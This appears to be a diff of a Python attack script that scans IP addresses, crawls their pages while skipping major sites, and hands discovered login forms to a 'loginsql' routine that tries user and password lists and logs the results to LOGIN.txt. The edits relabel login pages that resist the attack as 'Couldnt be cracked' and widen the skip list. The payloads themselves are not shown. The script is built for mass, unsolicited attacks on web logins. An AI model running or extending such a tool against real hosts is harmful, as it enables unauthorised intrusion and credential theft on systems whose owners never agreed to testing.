@@ -114,7 +114,7 @@ def loginsql(site, user_field, password_field, USERS, PASSWORDS, title, html_con
 			fo.write(url + " " +titlez +" with: " +payload+ "\n")
 			fo.close
 		else:
-			print("   Login Found:NOTVULN")
+			print("   Login Found: Couldnt be cracked")
 			fo = open("LOGIN.txt", "a+")
 			fo.write(url + "\n" + str(ipnuts) + "\n")
 			fo.close
@@ -130,7 +130,7 @@ def title(ip):
 	url = ("http://" + ip + "/")
 	sitelists = []
 	#print("[+] Deep looking: " +url)
-	blacklist = ['*stackoverflow*', '*google*', '*yahoo*', '*instagram*', '*facebook*' ,'*youtube*', '*twitter*','*tiktok*','*snapchat*','*gmail*','*amazon*', '*nginx*']
+	blacklist = ['*stackoverflow*', '*youtu*', '*google*', '*yahoo*', '*cloudflare*','*instagram*', '*facebook*' ,'*youtube*', '*twitter*','*tiktok*','*snapchat*','*gmail*','*amazon*', '*nginx*']
 	try:
 		rqt = requests.get(url, timeout=6, verify=True)
 		soupr = BeautifulSoup(rqt.content, 'html.parser')
@@ -153,10 +153,11 @@ def title(ip):
 					print("[+] Branched scan: " + url + " : " + title + "  [+]")
 					kkk = open("servers.txt", "a").write(ip + " " + title + "\n")
 					sitelists.append(site)
-					print(sitelists)
-					print("Appended branch: " + site) 
+					#print(sitelists)
+					#print("Appended branch: " + site) 
 					loginsql(site, user_field, password_field, USERS, PASSWORDS , title, r.text)
 				except:
+					print("Branch already scanned" + site)
 					pass
 			else:
 				pass
@@ -191,4 +192,3 @@ def main():
 			title(ip)
 
 main()
-
